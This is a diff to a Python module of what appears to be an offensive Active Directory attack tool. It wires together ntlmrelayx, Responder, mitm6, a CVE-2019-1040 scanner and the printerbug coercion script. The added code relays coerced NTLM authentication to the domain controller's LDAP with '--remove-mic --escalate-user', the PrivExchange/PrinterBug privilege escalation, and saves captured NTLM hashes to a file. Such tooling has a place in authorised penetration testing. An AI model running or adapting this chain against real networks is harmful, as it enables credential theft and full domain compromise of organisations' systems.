@@ -1,10 +1,9 @@
 #!/usr/bin/env python3
 
 import os
-from src.process import Process
 import re
 import os
-from src.utils import get_iface
+from src.utils import print_info, parse_creds
 from src.process import Process
 
 cwd = os.getcwd()
@@ -16,10 +15,20 @@ def create_ntlmrelayx_cmd(args):
 #    relay_cmd = f'python {cwd}/tools/impacket/examples/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'
     relay_cmd = f'python {cwd}/tools/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'
 
-    if args.target:
-        target = f' -t {args.target}'
+    # PrinterBug/PrivExchange
+    if args.user:
+        dom, user, pw, host = parse_creds(args)
+        target = f' -t ldap://{args.domain_controller}'
+        relay_cmd = relay_cmd + f" --remove-mic --escalate-user {user}" + target
+        return relay_cmd
+
+    # Normal usage
     else:
-        target = f' -tf unsigned-smb-hosts.txt'
+        target = f' -tf '
+        if args.target_file:
+            target += args.target_file
+        else:
+            target += 'unsigned-smb-hosts.txt'
 
     relay_cmd = relay_cmd + target
 
@@ -38,7 +47,7 @@ def start_ntlmrelayx(args):
     """
     cmd = create_ntlmrelayx_cmd(args)
     logfile_name = 'ntlmrelayx'
-    ntlmrelayx = start_process(cmd, logfile_name)
+    ntlmrelayx = start_process(cmd, logfile_name, live_output=True)
 
     return ntlmrelayx
 
@@ -63,9 +72,7 @@ def edit_responder_conf(switch, protocols, conf):
     with open(conf, 'w') as f:
         f.write(filedata)
 
-def start_responder(iface=None):
-    if not iface:
-        iface = get_iface()
+def start_responder(iface):
     protocols = ['HTTP', 'SMB']
     switch = 'Off'
     conf = 'tools/Responder/Responder.conf'
@@ -78,7 +85,7 @@ def start_responder(iface=None):
     return responder
 
 def start_mitm6(args):
-    cmd = f'python {cwd}/tools/mitm6.py --ignore-nofqdn'
+    cmd = f'python {cwd}/tools/mitm6/mitm6/mitm6.py --ignore-nofqdn'
     if args.domain:
         cmd = cmd + f' -d {args.domain}'
     if args.interface:
@@ -89,18 +96,36 @@ def start_mitm6(args):
 
     return mitm6
 
-def start_process(cmd, logfile_name):
+def start_exchange_scan(args):
+    if args.exchange_file:
+        with open(args.exchange_file, "r") as f:
+            target = f.readlines()[0]
+        cmd = f'python {cwd}/tools/cve-2019-1040-scanner/scan.py -target-file {args.exchange_file} {args.user}@{target}'
+    else:
+        cmd = f'python {cwd}/tools/cve-2019-1040-scanner/scan.py {args.user}'
+
+    logfile_name = "exchange_scanner"
+    scan = start_process(cmd, logfile_name, live_output=True)
+
+    return scan
+
+def start_printerbug(creds, exchange_server, local_ip):
+    dom_user_pw = creds.rsplit('@', 1)[0]
+    cmd = f'python {cwd}/tools/krbrelayx/printerbug.py {dom_user_pw}@{exchange_server} {local_ip}'
+    logfile = 'printerbug'
+    printerbug = start_process(cmd, logfile)
+    return printerbug
+
+def start_process(cmd, logfile_name, live_output=False):
     proc = Process(cmd)
-    proc.run(f'{cwd}/logs/{logfile_name}.log')
+
+    logfile = f'{cwd}/logs/{logfile_name}.log'
+
+    print_info(f"Running {proc.cmd}")
+
+    proc.run(logfile, live_output=live_output)
 
     return proc
-
-# def start_scanMic(args):
-#     cmd = f'python {cwd}/tools/cve-2019-1040-scanner/scan.py -target-file exchange-servers.txt {creds}'
-#     logfile_name = 'scanMic'
-#     scanMic = start_process(cmd, logfile_name)
-#
-#     return scanMic
 
 # regular
 'python {}/tools/ntlmrelayx.py -tf smb-unsigned-hosts.txt -of {}/hashes-ntlmrelay-hashes -smb2support'
